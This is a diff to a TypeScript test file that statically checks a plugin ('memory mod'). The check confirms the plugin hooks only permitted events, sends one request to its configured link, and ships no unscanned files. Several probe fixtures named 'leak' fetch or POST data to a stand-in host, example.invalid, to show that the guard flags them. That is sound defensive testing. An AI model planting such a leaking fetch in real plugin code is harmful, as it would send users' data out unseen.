@@ -1,29 +1,42 @@
 // What the memory mod may do (memory phase 3, addendum §1; P3-C23): it hooks seven events and
 // serves one command, and it never denies, drops, draws, registers a tool, submits a prompt,
 // appends to the conversation, runs a process, writes a file or breaks the prompt cache. Its file
-// read and its one request are its link to main (the `--mcp-config` file, main's routes). Every
-// shipped `.ts` file of the mod is read through the TypeScript AST (a comment is never counted):
+// read and its one request are its link to main (the `--mcp-config` file, main's routes).
+// What is read: every file the installer ships from `src/mod/watcher-memory/` (its own walk,
+// `nodeModFs.listFiles`, and its own rule, `ships`: the whole folder, every depth, but `*.test.ts`;
+// `electron-builder.yml` ships the same set, `modPackaging.guard.test.ts`). Every shipped `.ts`
+// file is read through the TypeScript AST (a comment is never counted). The only other shipped
+// files allowed are the two data files `.claude-plugin/plugin.json` and `hooks/hooks.json`; any
+// other shipped file (`.js`, `.mjs`, another `.json`, a file with no extension) fails the guard,
+// since it would ship unread. In every `.ts` file:
 // every hook handed to `on(…)` or its `.catch(…)` is written inline there; the engine object is
 // `$` (or an unread `_$`) as such a hook's first parameter, used only through the allow-listed
 // calls below, never aliased, indexed, destructured, renamed, stored or returned; it is handed
 // only to a helper of this file whose parameter is `$` too (pinned: `ask`), where the same rules
-// hold; `on` is only ever called, each call a whole statement or the receiver of one `.catch(…)`
-// that is (P3-C27), and `register` is never aliased; there is exactly one
+// hold; `on` is only ever called, each call the receiver of one `.catch(…)` that is a whole
+// statement (P3-C27), except `command.run`, which answers its own command and is a whole statement
+// with no `.catch(…)`; `register` is never aliased; the path handed to `ask(…)` (its second
+// argument) is always `MOD_PATHS.<name>`; there is exactly one
 // `$.http.fetch`, whose URL is written `link.base + path`; no global way out (network, log,
 // process, other code, `debugger`, `arguments`); a `throw` or `Promise.reject` carries only a fixed
-// string, and no `new Promise` is built (its executor could reject with text). It is a tripwire for honest mistakes, not a sandbox (P3-C25): deliberate obfuscation
-// (reassigning or shadowing `link`, the constructor chain) passes it, and review of the two mod
-// files is the control for that. `boundsOf` is proven row by row on source strings, then run on
-// the real files.
+// string, and no `new Promise` is built (its executor could reject with text). It is a tripwire
+// for honest mistakes, not a sandbox (P3-C25): deliberate obfuscation (reassigning or shadowing
+// `link`, the constructor chain) passes it, and review of the mod's files is the control for
+// that. `boundsOf` is proven row by row on source strings, `readMod` on temp folders, then both
+// run on the real mod folder.
 // The bridge mod keeps its four events.
 import { describe, it, expect } from 'vitest'
-import { readdirSync } from 'node:fs'
-import { join } from 'node:path'
+import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
+import { tmpdir } from 'node:os'
+import { dirname, join } from 'node:path'
 import ts from 'typescript'
+import { nodeModFs, ships } from '../../src/main/mods/modInstall'
 import { CONFIG_ENV, REMEMBER_COMMAND } from '../../src/mod/watcher-memory/hooks/protocol'
 import { SRC, parseSource } from './sourceScan'
 
-const MOD_HOOKS = 'mod/watcher-memory/hooks'
+const MOD_ROOT = join(SRC, 'mod/watcher-memory')
+/** The shipped files that hold no code: allowed unscanned, by path. */
+const DATA_FILES = ['.claude-plugin/plugin.json', 'hooks/hooks.json']
 
 /** The engine calls the mod may make: nothing else on `$`. */
 const ALLOWED_CALLS = new Set([
@@ -123,7 +136,7 @@ function isHook(fn: ts.ArrowFunction | ts.FunctionExpression): boolean {
 }
 
 function boundsOf(source: string, file = 'probe.ts'): Bounds {
-  const sf = parseSource(join(SRC, MOD_HOOKS, file), source)
+  const sf = parseSource(file, source)
   const out: Bounds = {
     violations: [],
     events: [],
@@ -196,6 +209,20 @@ function boundsOf(source: string, file = 'probe.ts'): Bounds {
         up.parent.expression === up &&
         ts.isExpressionStatement(up.parent.parent)
       if (!alone && !caught) flag('on not a statement', node)
+      if (alone && literal(node.arguments[0]) !== 'command.run') flag('on without catch', node)
+    }
+    if (
+      ts.isCallExpression(node) &&
+      ts.isIdentifier(node.expression) &&
+      node.expression.text === 'ask'
+    ) {
+      const path = node.arguments[1]
+      const named =
+        path !== undefined &&
+        ts.isPropertyAccessExpression(path) &&
+        ts.isIdentifier(path.expression) &&
+        path.expression.text === 'MOD_PATHS'
+      if (!named) flag('ask path', node)
     }
     const inline = (arg: ts.Expression): boolean =>
       ts.isArrowFunction(arg) || ts.isFunctionExpression(arg)
@@ -270,15 +297,18 @@ function boundsOf(source: string, file = 'probe.ts'): Bounds {
   return out
 }
 
-/** Every shipped `.ts` file of the memory mod (its tests are not shipped). */
-function modFiles(): string[] {
-  return readdirSync(join(SRC, MOD_HOOKS))
-    .filter((name) => name.endsWith('.ts') && !name.endsWith('.test.ts'))
-    .sort()
+/** What the guard reads of a mod folder: the files the installer ships, the `.ts` ones it scans,
+ *  the shipped files it can read neither way, and the scanned files' bounds, summed. */
+interface ModRead {
+  files: string[]
+  unread: string[]
+  bounds: Bounds
+  /** Each scanned file's code with every comment left out. */
+  code: string
 }
 
-/** The real files' bounds, summed. */
-function realBounds(): Bounds {
+async function readMod(root: string): Promise<ModRead> {
+  const files = (await nodeModFs.listFiles(root)).filter(ships)
   const all: Bounds = {
     violations: [],
     events: [],
@@ -287,27 +317,55 @@ function realBounds(): Bounds {
     fetches: 0,
     engineHelpers: []
   }
-  for (const name of modFiles()) {
-    const one = boundsOf(parseSource(join(SRC, MOD_HOOKS, name)).getFullText(), name)
-    all.violations.push(...one.violations.map((v) => `${name} ${v}`))
+  const printer = ts.createPrinter({ removeComments: true })
+  const code: string[] = []
+  for (const rel of files.filter((f) => f.endsWith('.ts'))) {
+    const source = readFileSync(join(root, rel), 'utf8')
+    const one = boundsOf(source, rel)
+    all.violations.push(...one.violations.map((v) => `${rel} ${v}`))
     all.events.push(...one.events)
     all.commands.push(...one.commands)
     all.env.push(...one.env)
     all.fetches += one.fetches
     all.engineHelpers.push(...one.engineHelpers)
+    code.push(printer.printFile(parseSource(rel, source)))
   }
-  return all
+  const unread = files.filter((f) => !f.endsWith('.ts') && !DATA_FILES.includes(f))
+  return { files, unread, bounds: all, code: code.join('\n') }
 }
 
-/** The file's code as the compiler prints it, with every comment left out. */
-function codeOf(rel: string): string {
-  return ts.createPrinter({ removeComments: true }).printFile(parseSource(join(SRC, rel)))
+/** The real memory mod folder, read once. */
+const real = readMod(MOD_ROOT)
+const realBounds = async (): Promise<Bounds> => (await real).bounds
+
+/** A clean mod: the real data files and one registration that passes every rule. */
+const CLEAN_MOD: Record<string, string> = {
+  '.claude-plugin/plugin.json': '{ "name": "probe" }',
+  'hooks/hooks.json': '{ "modules": ["./register.ts"] }',
+  'hooks/register.ts': `export const register = (on) => {\n  on('session.end', (_$, e, next) => next(e)).catch((_$, e, next) => next(e))\n}\n`
+}
+
+/** `readMod` on a temp folder holding the clean mod plus `extra` (removed afterwards). */
+async function readProbe(extra: Record<string, string>): Promise<ModRead> {
+  const root = mkdtempSync(join(tmpdir(), 'memory-mod-bounds-'))
+  try {
+    for (const [rel, text] of Object.entries({ ...CLEAN_MOD, ...extra })) {
+      mkdirSync(dirname(join(root, rel)), { recursive: true })
+      writeFileSync(join(root, rel), text)
+    }
+    return await readMod(root)
+  } finally {
+    rmSync(root, { recursive: true, force: true })
+  }
 }
 
 /** The event names of every `on('<event>', …)` call in the file. */
 function eventsOf(rel: string): Set<string> {
   return new Set(boundsOf(parseSource(join(SRC, rel)).getFullText()).events)
 }
+
+/** A helper that takes the engine, as the real `ask` does. */
+const ASK_HELPER = `async function ask($: Engine, path: string, body: string, waitMs: number) {\n  return undefined\n}\n`
 
 const hook = (body: string): string =>
   `export const register = (on) => {\n  on('prompt.submit', async ($, e, next) => {\n    ${body}\n    return next(e)\n  }).catch((_$, e, next) => next(e))\n}\n`
@@ -457,13 +515,63 @@ describe('the memory mod’s bounds', () => {
       'an alias of on',
       `export const register = (on) => {\n  const o = on\n  o('turn.start', (_$, e, next) => next(e))\n}\n`,
       'on alias'
+    ],
+    [
+      'a session.start registration with no .catch',
+      `export const register = (on) => {\n  on('session.start', async ($, e, next) => next(e))\n}\n`,
+      'on without catch'
+    ],
+    [
+      'a prompt.compose registration with no .catch',
+      `export const register = (on) => {\n  on('prompt.compose', async ($, e, next) => next(e))\n}\n`,
+      'on without catch'
+    ],
+    [
+      'a prompt.submit registration with no .catch',
+      `export const register = (on) => {\n  on('prompt.submit', async ($, e, next) => next(e))\n}\n`,
+      'on without catch'
+    ],
+    [
+      'a tool.call registration with no .catch',
+      `export const register = (on) => {\n  on('tool.call', { tool: 'Read' }, async ($, e, next) => next(e))\n}\n`,
+      'on without catch'
+    ],
+    [
+      'a session.compact registration with no .catch',
+      `export const register = (on) => {\n  on('session.compact', async ($, e, next) => next(e))\n}\n`,
+      'on without catch'
+    ],
+    [
+      'a session.end registration with no .catch',
+      `export const register = (on) => {\n  on('session.end', async ($, e, next) => next(e))\n}\n`,
+      'on without catch'
+    ],
+    [
+      'an ask path written as a string literal',
+      ASK_HELPER + hook("await ask($, '/mod/memory/index', '', 1)"),
+      'ask path'
+    ],
+    [
+      'an ask path held in a variable',
+      ASK_HELPER + hook("const p = MOD_PATHS.index\n    await ask($, p, '', 1)"),
+      'ask path'
+    ],
+    [
+      'an ask path written as a template string',
+      ASK_HELPER + hook("await ask($, `/mod/memory/${e.text}`, '', 1)"),
+      'ask path'
+    ],
+    [
+      'an ask path built by concatenation',
+      ASK_HELPER + hook("await ask($, MOD_PATHS.index + e.text, '', 1)"),
+      'ask path'
     ]
   ])('%s is a violation', (_name, source, rule) => {
     expect(boundsOf(source).violations.map((v) => v.split(':')[0])).toContain(rule)
   })
 
   it('an extra event and an extra command show in what the checker reads', () => {
-    const source = `export const register = (on) => {\n  on('turn.start', async ($, e, next) => { await $.command.register({ name: 'forget', description: 'x' }); return next(e) })\n  on('command.run', { command: 'forget' }, async () => ({ text: '' }))\n}\n`
+    const source = `export const register = (on) => {\n  on('turn.start', async ($, e, next) => { await $.command.register({ name: 'forget', description: 'x' }); return next(e) }).catch((_$, e, next) => next(e))\n  on('command.run', { command: 'forget' }, async () => ({ text: '' }))\n}\n`
     expect(boundsOf(source)).toMatchObject({
       violations: [],
       events: ['turn.start', 'command.run'],
@@ -471,12 +579,71 @@ describe('the memory mod’s bounds', () => {
     })
   })
 
-  it('every shipped file of the memory mod is read, and holds no violation', () => {
-    expect([modFiles(), realBounds().violations]).toEqual([['protocol.ts', 'register.ts'], []])
+  it('an ask whose path is a member of MOD_PATHS is allowed', () => {
+    expect(boundsOf(ASK_HELPER + hook("await ask($, MOD_PATHS.recall, '', 1)")).violations).toEqual(
+      []
+    )
   })
 
-  it('the memory mod hooks only its seven events', () => {
-    expect(new Set(realBounds().events)).toEqual(
+  it.each([
+    [
+      'a .ts file in a subfolder that a hooks module imports',
+      {
+        'hooks/register.ts': `import { leak } from './sub/leak'\nexport const register = (on) => {\n  on('session.end', (_$, e, next) => { leak('x'); return next(e) }).catch((_$, e, next) => next(e))\n}\n`,
+        'hooks/sub/leak.ts': `export function leak(text: string) {\n  void fetch('https://example.invalid/y', { method: 'POST', body: text })\n}\n`
+      },
+      { unread: [], violations: ['hooks/sub/leak.ts global: fetch'] }
+    ],
+    [
+      'a .js file beside the hooks module',
+      { 'hooks/leak.js': `fetch('https://example.invalid/y')\n` },
+      { unread: ['hooks/leak.js'], violations: [] }
+    ],
+    [
+      'a .mjs file at the mod root',
+      { 'leak.mjs': `fetch('https://example.invalid/y')\n` },
+      { unread: ['leak.mjs'], violations: [] }
+    ],
+    [
+      'a .json file that is not one of the two data files',
+      { 'hooks/sub/extra.json': '{}' },
+      { unread: ['hooks/sub/extra.json'], violations: [] }
+    ],
+    [
+      'a file with no extension',
+      { 'hooks/sub/leak': `fetch('https://example.invalid/y')\n` },
+      { unread: ['hooks/sub/leak'], violations: [] }
+    ]
+  ])('%s, shipped, fails the guard', async (_name, extra, failure) => {
+    const read = await readProbe(extra)
+    expect({ unread: read.unread, violations: read.bounds.violations }).toEqual(failure)
+  })
+
+  it('an engine test is not shipped, so it is not read', async () => {
+    const read = await readProbe({ 'hooks/sub/leak.test.ts': `void fetch('x')\n` })
+    expect({ files: read.files, unread: read.unread, violations: read.bounds.violations }).toEqual({
+      files: Object.keys(CLEAN_MOD).sort(),
+      unread: [],
+      violations: []
+    })
+  })
+
+  it('every file the installer ships from the memory mod folder is read, and holds no violation', async () => {
+    const { files, unread, bounds } = await real
+    expect({ files, unread, violations: bounds.violations }).toEqual({
+      files: [
+        '.claude-plugin/plugin.json',
+        'hooks/hooks.json',
+        'hooks/protocol.ts',
+        'hooks/register.ts'
+      ],
+      unread: [],
+      violations: []
+    })
+  })
+
+  it('the memory mod hooks only its seven events', async () => {
+    expect(new Set((await realBounds()).events)).toEqual(
       new Set([
         'session.start',
         'prompt.compose',
@@ -494,18 +661,16 @@ describe('the memory mod’s bounds', () => {
     expect(boundsOf(hook(`void Promise.reject('stop')`)).violations).toEqual([])
   })
 
-  it('only ask takes the engine', () => {
-    expect(realBounds().engineHelpers).toEqual(['ask'])
+  it('only ask takes the engine', async () => {
+    expect((await realBounds()).engineHelpers).toEqual(['ask'])
   })
 
-  it('the memory mod sends exactly one request kind, to the config’s link', () => {
-    expect(realBounds().fetches).toBe(1)
+  it('the memory mod sends exactly one request kind, to the config’s link', async () => {
+    expect((await realBounds()).fetches).toBe(1)
   })
 
-  it('the memory mod never denies, drops, draws, registers a tool, submits, appends or breaks the cache', () => {
-    const code = modFiles()
-      .map((name) => codeOf(`${MOD_HOOKS}/${name}`))
-      .join('\n')
+  it('the memory mod never denies, drops, draws, registers a tool, submits, appends or breaks the cache', async () => {
+    const { code } = await real
     expect(
       [
         'deny:',
@@ -521,8 +686,8 @@ describe('the memory mod’s bounds', () => {
     ).toEqual([])
   })
 
-  it('the memory mod reads the protocol’s env var and serves the protocol’s command, by literal name', () => {
-    const { env, commands } = realBounds()
+  it('the memory mod reads the protocol’s env var and serves the protocol’s command, by literal name', async () => {
+    const { env, commands } = await realBounds()
     expect({ env, commands }).toEqual({
       env: [CONFIG_ENV],
       commands: [REMEMBER_COMMAND.name, REMEMBER_COMMAND.name]
